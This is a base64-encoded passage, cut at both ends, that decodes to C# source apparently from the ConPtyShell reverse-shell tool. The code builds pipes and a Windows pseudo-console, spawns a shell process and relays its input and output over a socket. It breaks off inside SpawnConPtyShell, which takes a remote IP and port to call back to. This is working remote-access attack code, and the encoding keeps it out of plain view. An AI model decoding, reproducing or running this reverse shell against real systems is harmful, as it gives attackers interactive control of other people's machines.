X0FUVFJJQlVURVMoKTsKICAgICAgICBwU2VjLm5MZW5ndGggPSBNYXJzaGFsLlNpemVPZihwU2VjKTsKICAgICAgICBwU2VjLmJJbmhlcml0SGFuZGxlID0gMTsKICAgICAgICBwU2VjLmxwU2VjdXJpdHlEZXNjcmlwdG9yID0gSW50UHRyLlplcm87CiAgICAgICAgaWYgKCFDcmVhdGVQaXBlKG91dCBJbnB1dFBpcGVSZWFkLCBvdXQgSW5wdXRQaXBlV3JpdGUsIHJlZiBwU2VjLCBCVUZGRVJfU0laRV9QSVBFKSkKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJDb3VsZCBub3QgY3JlYXRlIHRoZSBJbnB1dFBpcGUiKTsKICAgICAgICBpZiAoIUNyZWF0ZVBpcGUob3V0IE91dHB1dFBpcGVSZWFkLCBvdXQgT3V0cHV0UGlwZVdyaXRlLCByZWYgcFNlYywgQlVGRkVSX1NJWkVfUElQRSkpCiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbigiQ291bGQgbm90IGNyZWF0ZSB0aGUgT3V0cHV0UGlwZSIpOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgSW5pdENvbnNvbGUocmVmIEludFB0ciBvbGRTdGRJbiwgcmVmIEludFB0ciBvbGRTdGRPdXQsIHJlZiBJbnRQdHIgb2xkU3RkRXJyKQogICAgewogICAgICAgIG9sZFN0ZEluID0gR2V0U3RkSGFuZGxlKFNURF9JTlBVVF9IQU5ETEUpOwogICAgICAgIG9sZFN0ZE91dCA9IEdldFN0ZEhhbmRsZShTVERfT1VUUFVUX0hBTkRMRSk7CiAgICAgICAgb2xkU3RkRXJyID0gR2V0U3RkSGFuZGxlKFNURF9FUlJPUl9IQU5ETEUpOwogICAgICAgIEludFB0ciBoU3Rkb3V0ID0gQ3JlYXRlRmlsZSgiQ09OT1VUJCIsIEdFTkVSSUNfUkVBRCB8IEdFTkVSSUNfV1JJVEUsIEZJTEVfU0hBUkVfUkVBRCB8IEZJTEVfU0hBUkVfV1JJVEUsIEludFB0ci5aZXJvLCBPUEVOX0VYSVNUSU5HLCBGSUxFX0FUVFJJQlVURV9OT1JNQUwsIEludFB0ci5aZXJvKTsKICAgICAgICBJbnRQdHIgaFN0ZGluID0gQ3JlYXRlRmlsZSgiQ09OSU4kIiwgR0VORVJJQ19SRUFEIHwgR0VORVJJQ19XUklURSwgRklMRV9TSEFSRV9SRUFEIHwgRklMRV9TSEFSRV9XUklURSwgSW50UHRyLlplcm8sIE9QRU5fRVhJU1RJTkcsIEZJTEVfQVRUUklCVVRFX05PUk1BTCwgSW50UHRyLlplcm8pOwogICAgICAgIFNldFN0ZEhhbmRsZShTVERfT1VUUFVUX0hBTkRMRSwgaFN0ZG91dCk7CiAgICAgICAgU2V0U3RkSGFuZGxlKFNURF9FUlJPUl9IQU5ETEUsIGhTdGRvdXQpOwogICAgICAgIFNldFN0ZEhhbmRsZShTVERfSU5QVVRfSEFORExFLCBoU3RkaW4pOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgUmVzdG9yZVN0ZEhhbmRsZXMoSW50UHRyIG9sZFN0ZEluLCBJbnRQdHIgb2xkU3RkT3V0LCBJbnRQdHIgb2xkU3RkRXJyKQogICAgewogICAgICAgIFNldFN0ZEhhbmRsZShTVERfT1VUUFVUX0hBTkRMRSwgb2xkU3RkT3V0KTsKICAgICAgICBTZXRTdGRIYW5kbGUoU1REX0VSUk9SX0hBTkRMRSwgb2xkU3RkRXJyKTsKICAgICAgICBTZXRTdGRIYW5kbGUoU1REX0lOUFVUX0hBTkRMRSwgb2xkU3RkSW4pOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgRW5hYmxlVmlydHVhbFRlcm1pbmFsU2VxdWVuY2VQcm9jZXNzaW5nKCkKICAgIHsKICAgICAgICB1aW50IG91dENvbnNvbGVNb2RlID0gMDsKICAgICAgICBJbnRQdHIgaFN0ZE91dCA9IEdldFN0ZEhhbmRsZShTVERfT1VUUFVUX0hBTkRMRSk7CiAgICAgICAgaWYgKCFHZXRDb25zb2xlTW9kZShoU3RkT3V0LCBvdXQgb3V0Q29uc29sZU1vZGUpKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJDb3VsZCBub3QgZ2V0IGNvbnNvbGUgbW9kZSIpOwogICAgICAgIH0KICAgICAgICBvdXRDb25zb2xlTW9kZSB8PSBFTkFCTEVfVklSVFVBTF9URVJNSU5BTF9QUk9DRVNTSU5HIHwgRElTQUJMRV9ORVdMSU5FX0FVVE9fUkVUVVJOOwogICAgICAgIGlmICghU2V0Q29uc29sZU1vZGUoaFN0ZE91dCwgb3V0Q29uc29sZU1vZGUpKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJDb3VsZCBub3QgZW5hYmxlIHZpcnR1YWwgdGVybWluYWwgcHJvY2Vzc2luZyIpOwogICAgICAgIH0KICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyBpbnQgQ3JlYXRlUHNldWRvQ29uc29sZVdpdGhQaXBlcyhyZWYgSW50UHRyIGhhbmRsZVBzZXVkb0NvbnNvbGUsIHJlZiBJbnRQdHIgQ29uUHR5SW5wdXRQaXBlUmVhZCwgcmVmIEludFB0ciBDb25QdHlPdXRwdXRQaXBlV3JpdGUsIHVpbnQgcm93cywgdWludCBjb2xzKQogICAgewogICAgICAgIGludCByZXN1bHQgPSAtMTsKICAgICAgICBFbmFibGVWaXJ0dWFsVGVybWluYWxTZXF1ZW5jZVByb2Nlc3NpbmcoKTsKICAgICAgICBDT09SRCBjb25zb2xlQ29vcmQgPSBuZXcgQ09PUkQoKTsKICAgICAgICBjb25zb2xlQ29vcmQuWCA9IChzaG9ydCljb2xzOwogICAgICAgIGNvbnNvbGVDb29yZC5ZID0gKHNob3J0KXJvd3M7CiAgICAgICAgcmVzdWx0ID0gQ3JlYXRlUHNldWRvQ29uc29sZShjb25zb2xlQ29vcmQsIENvblB0eUlucHV0UGlwZVJlYWQsIENvblB0eU91dHB1dFBpcGVXcml0ZSwgMCwgb3V0IGhhbmRsZVBzZXVkb0NvbnNvbGUpOwogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgU1RBUlRVUElORk9FWCBDb25maWd1cmVQcm9jZXNzVGhyZWFkKEludFB0ciBoYW5kbGVQc2V1ZG9Db25zb2xlLCBJbnRQdHIgYXR0cmlidXRlcykKICAgIHsKICAgICAgICBJbnRQdHIgbHBTaXplID0gSW50UHRyLlplcm87CiAgICAgICAgYm9vbCBzdWNjZXNzID0gSW5pdGlhbGl6ZVByb2NUaHJlYWRBdHRyaWJ1dGVMaXN0KEludFB0ci5aZXJvLCAxLCAwLCByZWYgbHBTaXplKTsKICAgICAgICBpZiAoc3VjY2VzcyB8fCBscFNpemUgPT0gSW50UHRyLlplcm8pCiAgICAgICAgewogICAgICAgICAgICB0aHJvdyBuZXcgQ29uUHR5U2hlbGxFeGNlcHRpb24oIkNvdWxkIG5vdCBjYWxjdWxhdGUgdGhlIG51bWJlciBvZiBieXRlcyBmb3IgdGhlIGF0dHJpYnV0ZSBsaXN0LiAiICsgTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpKTsKICAgICAgICB9CiAgICAgICAgU1RBUlRVUElORk9FWCBzdGFydHVwSW5mbyA9IG5ldyBTVEFSVFVQSU5GT0VYKCk7CiAgICAgICAgc3RhcnR1cEluZm8uU3RhcnR1cEluZm8uY2IgPSBNYXJzaGFsLlNpemVPZihzdGFydHVwSW5mbyk7CiAgICAgICAgc3RhcnR1cEluZm8ubHBBdHRyaWJ1dGVMaXN0ID0gTWFyc2hhbC5BbGxvY0hHbG9iYWwobHBTaXplKTsKICAgICAgICBzdWNjZXNzID0gSW5pdGlhbGl6ZVByb2NUaHJlYWRBdHRyaWJ1dGVMaXN0KHN0YXJ0dXBJbmZvLmxwQXR0cmlidXRlTGlzdCwgMSwgMCwgcmVmIGxwU2l6ZSk7CiAgICAgICAgaWYgKCFzdWNjZXNzKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJDb3VsZCBub3Qgc2V0IHVwIGF0dHJpYnV0ZSBsaXN0LiAiICsgTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpKTsKICAgICAgICB9CiAgICAgICAgc3VjY2VzcyA9IFVwZGF0ZVByb2NUaHJlYWRBdHRyaWJ1dGUoc3RhcnR1cEluZm8ubHBBdHRyaWJ1dGVMaXN0LCAwLCBhdHRyaWJ1dGVzLCBoYW5kbGVQc2V1ZG9Db25zb2xlLCAoSW50UHRyKUludFB0ci5TaXplLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8pOwogICAgICAgIGlmICghc3VjY2VzcykKICAgICAgICB7CiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbigiQ291bGQgbm90IHNldCBwc2V1ZG9jb25zb2xlIHRocmVhZCBhdHRyaWJ1dGUuICIgKyBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCkpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gc3RhcnR1cEluZm87CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgUFJPQ0VTU19JTkZPUk1BVElPTiBSdW5Qcm9jZXNzKHJlZiBTVEFSVFVQSU5GT0VYIHNJbmZvRXgsIHN0cmluZyBjb21tYW5kTGluZSkKICAgIHsKICAgICAgICBQUk9DRVNTX0lORk9STUFUSU9OIHBJbmZvID0gbmV3IFBST0NFU1NfSU5GT1JNQVRJT04oKTsKICAgICAgICBTRUNVUklUWV9BVFRSSUJVVEVTIHBTZWMgPSBuZXcgU0VDVVJJVFlfQVRUUklCVVRFUygpOwogICAgICAgIGludCBzZWN1cml0eUF0dHJpYnV0ZVNpemUgPSBNYXJzaGFsLlNpemVPZihwU2VjKTsKICAgICAgICBwU2VjLm5MZW5ndGggPSBzZWN1cml0eUF0dHJpYnV0ZVNpemU7CiAgICAgICAgU0VDVVJJVFlfQVRUUklCVVRFUyB0U2VjID0gbmV3IFNFQ1VSSVRZX0FUVFJJQlVURVMoKTsKICAgICAgICB0U2VjLm5MZW5ndGggPSBzZWN1cml0eUF0dHJpYnV0ZVNpemU7CiAgICAgICAgYm9vbCBzdWNjZXNzID0gQ3JlYXRlUHJvY2Vzc0V4KG51bGwsIGNvbW1hbmRMaW5lLCByZWYgcFNlYywgcmVmIHRTZWMsIGZhbHNlLCBFWFRFTkRFRF9TVEFSVFVQSU5GT19QUkVTRU5ULCBJbnRQdHIuWmVybywgbnVsbCwgcmVmIHNJbmZvRXgsIG91dCBwSW5mbyk7CiAgICAgICAgaWYgKCFzdWNjZXNzKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJDb3VsZCBub3QgY3JlYXRlIHByb2Nlc3MuICIgKyBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCkpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gcEluZm87CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgUFJPQ0VTU19JTkZPUk1BVElPTiBDcmVhdGVDaGlsZFByb2Nlc3NXaXRoUHNldWRvQ29uc29sZShJbnRQdHIgaGFuZGxlUHNldWRvQ29uc29sZSwgc3RyaW5nIGNvbW1hbmRMaW5lKQogICAgewogICAgICAgIFNUQVJUVVBJTkZPRVggc3RhcnR1cEluZm8gPSBDb25maWd1cmVQcm9jZXNzVGhyZWFkKGhhbmRsZVBzZXVkb0NvbnNvbGUsIChJbnRQdHIpUFJPQ19USFJFQURfQVRUUklCVVRFX1BTRVVET0NPTlNPTEUpOwogICAgICAgIFBST0NFU1NfSU5GT1JNQVRJT04gcHJvY2Vzc0luZm8gPSBSdW5Qcm9jZXNzKHJlZiBzdGFydHVwSW5mbywgY29tbWFuZExpbmUpOwogICAgICAgIHJldHVybiBwcm9jZXNzSW5mbzsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXRPdmVybGFwcGVkKG9iamVjdCB0aHJlYWRQYXJhbXMpCiAgICB7CiAgICAgICAgb2JqZWN0W10gdGhyZWFkUGFyYW1ldGVycyA9IChvYmplY3RbXSl0aHJlYWRQYXJhbXM7CiAgICAgICAgSW50UHRyIE91dHB1dFBpcGVSZWFkID0gKEludFB0cil0aHJlYWRQYXJhbWV0ZXJzWzBdOwogICAgICAgIEludFB0ciBzaGVsbFNvY2tldCA9IChJbnRQdHIpdGhyZWFkUGFyYW1ldGVyc1sxXTsKICAgICAgICBpbnQgYnVmZmVyU2l6ZSA9IDgxOTI7CiAgICAgICAgYm9vbCByZWFkU3VjY2VzcyA9IGZhbHNlOwogICAgICAgIEludDMyIGJ5dGVzU2VudCA9IDA7CiAgICAgICAgdWludCBkd0J5dGVzUmVhZCA9IDA7CiAgICAgICAgZG8KICAgICAgICB7CiAgICAgICAgICAgIGJ5dGVbXSBieXRlc1RvV3JpdGUgPSBuZXcgYnl0ZVtidWZmZXJTaXplXTsKICAgICAgICAgICAgcmVhZFN1Y2Nlc3MgPSBSZWFkRmlsZShPdXRwdXRQaXBlUmVhZCwgYnl0ZXNUb1dyaXRlLCAodWludClidWZmZXJTaXplLCBvdXQgZHdCeXRlc1JlYWQsIEludFB0ci5aZXJvKTsKICAgICAgICAgICAgYnl0ZXNTZW50ID0gc2VuZChzaGVsbFNvY2tldCwgYnl0ZXNUb1dyaXRlLCAoaW50KWR3Qnl0ZXNSZWFkLCAwKTsKICAgICAgICB9IHdoaWxlIChieXRlc1NlbnQgPiAwICYmIHJlYWRTdWNjZXNzKTsKICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWc6IGJ5dGVzU2VudCA9ICIgKyBieXRlc1NlbnQgKyAiIFdTQUdldExhc3RFcnJvcigpID0gIiArIFdTQUdldExhc3RFcnJvcigpLlRvU3RyaW5nKCkpOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldE5vbk92ZXJsYXBwZWQob2JqZWN0IHRocmVhZFBhcmFtcykKICAgIHsKICAgICAgICBvYmplY3RbXSB0aHJlYWRQYXJhbWV0ZXJzID0gKG9iamVjdFtdKXRocmVhZFBhcmFtczsKICAgICAgICBJbnRQdHIgT3V0cHV0UGlwZVJlYWQgPSAoSW50UHRyKXRocmVhZFBhcmFtZXRlcnNbMF07CiAgICAgICAgSW50UHRyIHNoZWxsU29ja2V0ID0gKEludFB0cil0aHJlYWRQYXJhbWV0ZXJzWzFdOwogICAgICAgIGludCBidWZmZXJTaXplID0gODE5MjsKICAgICAgICBib29sIHJlYWRTdWNjZXNzID0gZmFsc2U7CiAgICAgICAgSW50MzIgYnl0ZXNTZW50ID0gMDsKICAgICAgICB1aW50IGR3Qnl0ZXNSZWFkID0gMDsKICAgICAgICBkbwogICAgICAgIHsKICAgICAgICAgICAgYnl0ZVtdIGJ5dGVzVG9Xcml0ZSA9IG5ldyBieXRlW2J1ZmZlclNpemVdOwogICAgICAgICAgICByZWFkU3VjY2VzcyA9IFJlYWRGaWxlKE91dHB1dFBpcGVSZWFkLCBieXRlc1RvV3JpdGUsICh1aW50KWJ1ZmZlclNpemUsIG91dCBkd0J5dGVzUmVhZCwgSW50UHRyLlplcm8pOwogICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWcgVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldCBSZWFkRmlsZTogZHdCeXRlc1JlYWQgPSAiICsgZHdCeXRlc1JlYWQgKyAiIE1hcnNoYWwuR2V0TGFzdFdpbjMyRXJyb3IoKSAiICsgTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpKTsKICAgICAgICAgICAgZG8KICAgICAgICAgICAgewogICAgICAgICAgICAgICAgYnl0ZXNTZW50ID0gc2VuZChzaGVsbFNvY2tldCwgYnl0ZXNUb1dyaXRlLCAoaW50KWR3Qnl0ZXNSZWFkLCAwKTsKICAgICAgICAgICAgICAgIC8vIENvbnNvbGUuV3JpdGVMaW5lKCJkZWJ1ZyBUaHJlYWRSZWFkUGlwZVdyaXRlU29ja2V0IHNlbmQ6IGJ5dGVzU2VudCA9ICIgKyBieXRlc1NlbnQgKyAiIFdTQUdldExhc3RFcnJvcigpID0gIiArIFdTQUdldExhc3RFcnJvcigpLlRvU3RyaW5nKCkpOwogICAgICAgICAgICB9IHdoaWxlIChXU0FHZXRMYXN0RXJyb3IoKSA9PSBXU0FFV09VTERCTE9DSyk7CiAgICAgICAgfSB3aGlsZSAoYnl0ZXNTZW50ID4gMCAmJiByZWFkU3VjY2Vzcyk7CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgVGhyZWFkIFN0YXJ0VGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldChJbnRQdHIgT3V0cHV0UGlwZVJlYWQsIEludFB0ciBzaGVsbFNvY2tldCwgYm9vbCBvdmVybGFwcGVkU29ja2V0KQogICAgewogICAgICAgIG9iamVjdFtdIHRocmVhZFBhcmFtZXRlcnMgPSBuZXcgb2JqZWN0WzJdOwogICAgICAgIHRocmVhZFBhcmFtZXRlcnNbMF0gPSBPdXRwdXRQaXBlUmVhZDsKICAgICAgICB0aHJlYWRQYXJhbWV0ZXJzWzFdID0gc2hlbGxTb2NrZXQ7CiAgICAgICAgVGhyZWFkIHRoVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldDsKICAgICAgICBpZihvdmVybGFwcGVkU29ja2V0KQogICAgICAgICAgICB0aFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXQgPSBuZXcgVGhyZWFkKFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXRPdmVybGFwcGVkKTsKICAgICAgICBlbHNlCiAgICAgICAgICAgIHRoVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldCA9IG5ldyBUaHJlYWQoVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldE5vbk92ZXJsYXBwZWQpOwogICAgICAgIHRoVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldC5TdGFydCh0aHJlYWRQYXJhbWV0ZXJzKTsKICAgICAgICByZXR1cm4gdGhUaHJlYWRSZWFkUGlwZVdyaXRlU29ja2V0OwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgVGhyZWFkUmVhZFNvY2tldFdyaXRlUGlwZU92ZXJsYXBwZWQob2JqZWN0IHRocmVhZFBhcmFtcykKICAgIHsKICAgICAgICBvYmplY3RbXSB0aHJlYWRQYXJhbWV0ZXJzID0gKG9iamVjdFtdKXRocmVhZFBhcmFtczsKICAgICAgICBJbnRQdHIgSW5wdXRQaXBlV3JpdGUgPSAoSW50UHRyKXRocmVhZFBhcmFtZXRlcnNbMF07CiAgICAgICAgSW50UHRyIHNoZWxsU29ja2V0ID0gKEludFB0cil0aHJlYWRQYXJhbWV0ZXJzWzFdOwogICAgICAgIEludFB0ciBoQ2hpbGRQcm9jZXNzID0gKEludFB0cil0aHJlYWRQYXJhbWV0ZXJzWzJdOwogICAgICAgIGludCBidWZmZXJTaXplID0gODE5MjsKICAgICAgICBib29sIHdyaXRlU3VjY2VzcyA9IGZhbHNlOwogICAgICAgIEludDMyIG5CeXRlc1JlY2VpdmVkID0gMDsKICAgICAgICB1aW50IGJ5dGVzV3JpdHRlbiA9IDA7CiAgICAgICAgZG8KICAgICAgICB7CiAgICAgICAgICAgIGJ5dGVbXSBieXRlc1JlY2VpdmVkID0gbmV3IGJ5dGVbYnVmZmVyU2l6ZV07CiAgICAgICAgICAgIG5CeXRlc1JlY2VpdmVkID0gcmVjdihzaGVsbFNvY2tldCwgYnl0ZXNSZWNlaXZlZCwgYnVmZmVyU2l6ZSwgMCk7CiAgICAgICAgICAgIHdyaXRlU3VjY2VzcyA9IFdyaXRlRmlsZShJbnB1dFBpcGVXcml0ZSwgYnl0ZXNSZWNlaXZlZCwgKHVpbnQpbkJ5dGVzUmVjZWl2ZWQsIG91dCBieXRlc1dyaXR0ZW4sIEludFB0ci5aZXJvKTsKICAgICAgICB9IHdoaWxlIChuQnl0ZXNSZWNlaXZlZCA+IDAgJiYgd3JpdGVTdWNjZXNzKTsKICAgICAgICAvLyAgQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBuQnl0ZXNSZWNlaXZlZCA9ICIgKyBuQnl0ZXNSZWNlaXZlZCArICIgV1NBR2V0TGFzdEVycm9yKCkgPSAiICsgV1NBR2V0TGFzdEVycm9yKCkuVG9TdHJpbmcoKSk7CiAgICAgICAgVGVybWluYXRlUHJvY2VzcyhoQ2hpbGRQcm9jZXNzLCAwKTsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIFRocmVhZFJlYWRTb2NrZXRXcml0ZVBpcGVOb25PdmVybGFwcGVkKG9iamVjdCB0aHJlYWRQYXJhbXMpCiAgICB7CiAgICAgICAgb2JqZWN0W10gdGhyZWFkUGFyYW1ldGVycyA9IChvYmplY3RbXSl0aHJlYWRQYXJhbXM7CiAgICAgICAgSW50UHRyIElucHV0UGlwZVdyaXRlID0gKEludFB0cil0aHJlYWRQYXJhbWV0ZXJzWzBdOwogICAgICAgIEludFB0ciBzaGVsbFNvY2tldCA9IChJbnRQdHIpdGhyZWFkUGFyYW1ldGVyc1sxXTsKICAgICAgICBJbnRQdHIgaENoaWxkUHJvY2VzcyA9IChJbnRQdHIpdGhyZWFkUGFyYW1ldGVyc1syXTsKICAgICAgICBpbnQgYnVmZmVyU2l6ZSA9IDgxOTI7CiAgICAgICAgYm9vbCB3cml0ZVN1Y2Nlc3MgPSBmYWxzZTsKICAgICAgICBJbnQzMiBuQnl0ZXNSZWNlaXZlZCA9IDA7CiAgICAgICAgdWludCBieXRlc1dyaXR0ZW4gPSAwOwogICAgICAgIGJvb2wgc29ja2V0QmxvY2tpbmdPcGVyYXRpb24gPSBmYWxzZTsKICAgICAgICBJbnRQdHIgd3NhUmVhZEV2ZW50ID0gV1NBQ3JlYXRlRXZlbnQoKTsKICAgICAgICAvLyB3ZSBleHBlY3QgdGhlIHNvY2tldCB0byBiZSBub24tYmxvY2tpbmcgYXQgdGhpcyBwb2ludC4gd2UgY3JlYXRlIGFuIGFzeW5jaCBldmVudCB0byBiZSBzaWduYWxlZCB3aGVuIHRoZSByZWN2IG9wZXJhdGlvbiBpcyByZWFkeSB0byBnZXQgc29tZSBkYXRhCiAgICAgICAgV1NBRXZlbnRTZWxlY3Qoc2hlbGxTb2NrZXQsIHdzYVJlYWRFdmVudCwgRkRfUkVBRCk7CiAgICAgICAgSW50UHRyW10gd3NhRXZlbnRzQXJyYXkgPSBuZXcgSW50UHRyW10geyB3c2FSZWFkRXZlbnQgfTsKICAgICAgICBkbwogICAgICAgIHsKICAgICAgICAgICAgYnl0ZVtdIGJ5dGVzUmVjZWl2ZWQgPSBuZXcgYnl0ZVtidWZmZXJTaXplXTsKICAgICAgICAgICAgV1NBV2FpdEZvck11bHRpcGxlRXZlbnRzKHdzYUV2ZW50c0FycmF5Lkxlbmd0aCwgd3NhRXZlbnRzQXJyYXksIHRydWUsIDUwMCwgZmFsc2UpOwogICAgICAgICAgICBuQnl0ZXNSZWNlaXZlZCA9IHJlY3Yoc2hlbGxTb2NrZXQsIGJ5dGVzUmVjZWl2ZWQsIGJ1ZmZlclNpemUsIDApOwogICAgICAgICAgICAvLyB3ZSBzdGlsbCBjaGVjayBXU0FFV09VTERCTE9DSyBmb3IgYSBtb3JlIHJvYnVzdCBpbXBsZW1lbnRhdGlvbgogICAgICAgICAgICBpZiAoV1NBR2V0TGFzdEVycm9yKCkgPT0gV1NBRVdPVUxEQkxPQ0spCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHNvY2tldEJsb2NraW5nT3BlcmF0aW9uID0gdHJ1ZTsKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIFdTQVJlc2V0RXZlbnQod3NhUmVhZEV2ZW50KTsKICAgICAgICAgICAgc29ja2V0QmxvY2tpbmdPcGVyYXRpb24gPSBmYWxzZTsKICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBUaHJlYWRSZWFkU29ja2V0V3JpdGVQaXBlIHJlY3Y6IG5CeXRlc1JlY2VpdmVkID0gIiArIG5CeXRlc1JlY2VpdmVkICsgIiBXU0FHZXRMYXN0RXJyb3IoKSA9ICIgKyBXU0FHZXRMYXN0RXJyb3IoKS5Ub1N0cmluZygpKTsKICAgICAgICAgICAgd3JpdGVTdWNjZXNzID0gV3JpdGVGaWxlKElucHV0UGlwZVdyaXRlLCBieXRlc1JlY2VpdmVkLCAodWludCluQnl0ZXNSZWNlaXZlZCwgb3V0IGJ5dGVzV3JpdHRlbiwgSW50UHRyLlplcm8pOwogICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWcgVGhyZWFkUmVhZFNvY2tldFdyaXRlUGlwZSBXcml0ZUZpbGU6IGJ5dGVzV3JpdHRlbiA9ICIgKyBieXRlc1dyaXR0ZW4gKyAiIE1hcnNoYWwuR2V0TGFzdFdpbjMyRXJyb3IoKSA9ICIgKyBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCkpOwogICAgICAgIH0gd2hpbGUgKHNvY2tldEJsb2NraW5nT3BlcmF0aW9uIHx8IChuQnl0ZXNSZWNlaXZlZCA+IDAgJiYgd3JpdGVTdWNjZXNzKSk7CiAgICAgICAgV1NBQ2xvc2VFdmVudCh3c2FSZWFkRXZlbnQpOwogICAgICAgIFRlcm1pbmF0ZVByb2Nlc3MoaENoaWxkUHJvY2VzcywgMCk7CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgVGhyZWFkIFN0YXJ0VGhyZWFkUmVhZFNvY2tldFdyaXRlUGlwZShJbnRQdHIgSW5wdXRQaXBlV3JpdGUsIEludFB0ciBzaGVsbFNvY2tldCwgSW50UHRyIGhDaGlsZFByb2Nlc3MsIGJvb2wgb3ZlcmxhcHBlZFNvY2tldCkKICAgIHsKICAgICAgICBvYmplY3RbXSB0aHJlYWRQYXJhbWV0ZXJzID0gbmV3IG9iamVjdFszXTsKICAgICAgICB0aHJlYWRQYXJhbWV0ZXJzWzBdID0gSW5wdXRQaXBlV3JpdGU7CiAgICAgICAgdGhyZWFkUGFyYW1ldGVyc1sxXSA9IHNoZWxsU29ja2V0OwogICAgICAgIHRocmVhZFBhcmFtZXRlcnNbMl0gPSBoQ2hpbGRQcm9jZXNzOwogICAgICAgIFRocmVhZCB0aFJlYWRTb2NrZXRXcml0ZVBpcGU7CiAgICAgICAgaWYob3ZlcmxhcHBlZFNvY2tldCkKICAgICAgICAgICAgdGhSZWFkU29ja2V0V3JpdGVQaXBlID0gbmV3IFRocmVhZChUaHJlYWRSZWFkU29ja2V0V3JpdGVQaXBlT3ZlcmxhcHBlZCk7CiAgICAgICAgZWxzZQogICAgICAgICAgICB0aFJlYWRTb2NrZXRXcml0ZVBpcGUgPSBuZXcgVGhyZWFkKFRocmVhZFJlYWRTb2NrZXRXcml0ZVBpcGVOb25PdmVybGFwcGVkKTsKICAgICAgICB0aFJlYWRTb2NrZXRXcml0ZVBpcGUuU3RhcnQodGhyZWFkUGFyYW1ldGVycyk7CiAgICAgICAgcmV0dXJuIHRoUmVhZFNvY2tldFdyaXRlUGlwZTsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBTcGF3bkNvblB0eVNoZWxsKHN0cmluZyByZW1vdGVJcCwgaW50IHJlbW90ZVBvcnQsIHVpbnQgcm93cywgdWludCBjb2xzLCBzdHJpbmcgY29tbWFuZExpbmUsIGJvb2wgdXBncmFkZVNoZWxsKQogICAgewogICAgICAgIEludFB0ciBzaGVsbFNvY2tldCA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciBJbnB1dFBpcGVSZWFkID0gSW50UHRyLlplcm87CiAgICAgICAgSW50UHRyIElucHV0UGlwZVdyaXRlID0gSW50UHRyLlplcm87CiAgICAgICAgSW50UHRyIE91dHB1dFBpcGVSZWFkID0gSW50UHRyLlplcm87CiAgICAgICAgSW50UHRyIE91dHB1dFBpcGVXcml0ZSA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciBoYW5kbGVQc2V1ZG9Db25zb2xlID0gSW50UHRyLlplcm87CiAgICAgICAgSW50UHRyIG9sZFN0ZEluID0gSW50UHRyLlplcm87CiAgICAgICAgSW50UHRyIG9sZFN0ZE91dCA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciBvbGRTdGRFcnIgPSBJbnRQdHIuWmVybzsKICAgICAgICBib29sIG5ld0NvbnNvbGVBbGxvY2F0ZWQgPSBmYWxzZTsKICAgICAgICBib29sIHBhcmVudFNvY2tldEluaGVyaXRlZCA9IGZhbHNlOwogICAgICAgIGJvb2wgZ3JhbmRQYXJlbnRTb2NrZXRJbmhlcml0ZWQgPSBmYWxzZTsKICAgICAgICBib29sIGNvbnB0eUNvbXBhdGlibGUgPSBmYWxzZTsKICAgICAgICBib29sIElzU29ja2V0T3ZlcmxhcHBlZCA9IHRydWU7CiAgICAgICAgc3RyaW5nIG91dHB1dCA9ICIiOwogICAgICAgIFByb2Nl